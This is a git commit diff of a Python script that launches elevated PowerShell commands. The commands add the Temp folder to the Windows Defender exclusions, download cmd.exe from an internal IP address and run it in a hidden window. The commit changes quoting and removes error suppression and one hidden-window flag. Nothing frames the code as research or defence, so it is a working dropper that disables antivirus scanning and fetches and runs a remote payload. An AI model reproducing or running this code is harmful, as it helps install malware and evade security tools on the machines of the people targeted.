f4e89b11a3d781f2e3f568531728d4457ab09833
nickdonegan <64035070+nickdonegan@users.noreply.github.com>
2024-04-23 05:11:35 -0700

    Update perhaps1.py

--- perhaps1.py
+++ perhaps1.py
@@ -2,16 +2,16 @@ import subprocess
 
 def run_hidden_admin_powershell(command):
     """Run a PowerShell command with admin privileges and a hidden window style."""
-    subprocess.Popen(["powershell.exe", "-Command", "Start-Process", "-Verb", "RunAs", "-WindowStyle", "Hidden", "powershell.exe", "-ArgumentList", "-Command", command], shell=True)
+    subprocess.Popen(["powershell.exe", "-Command", "Start-Process", "-Verb", "RunAs", "-FilePath", "powershell.exe", "-ArgumentList", f'"-Command {command}"'], shell=True)
 
 def main():
     # Commands to execute in PowerShell
     commands = [
-        '$ErrorActionPreference = "SilentlyContinue"',  # Suppress errors
-        'Add-MpPreference -ExclusionPath "$env:Temp"',  # Add temp folder to Defender exclusions
-        'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile "$env:Temp\\cmd.exe"',  # Download cmd.exe to temp folder
-        'Start-Process -FilePath "$env:Temp\\cmd.exe" -WindowStyle Hidden'  # Run cmd.exe from temp folder in the background
+        'Add-MpPreference -ExclusionPath `"$env:Temp`"',  # Add temp folder to Defender exclusions
+        'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile `"$env:Temp\\cmd.exe`"',  # Download cmd.exe to temp folder
+        'Start-Process -FilePath `"$env:Temp\\cmd.exe`" -WindowStyle Hidden'  # Run cmd.exe from temp folder in the background
     ]
+
 
     # Concatenate commands with semicolons to run them in a single PowerShell instance
     powershell_command = ";".join(commands)
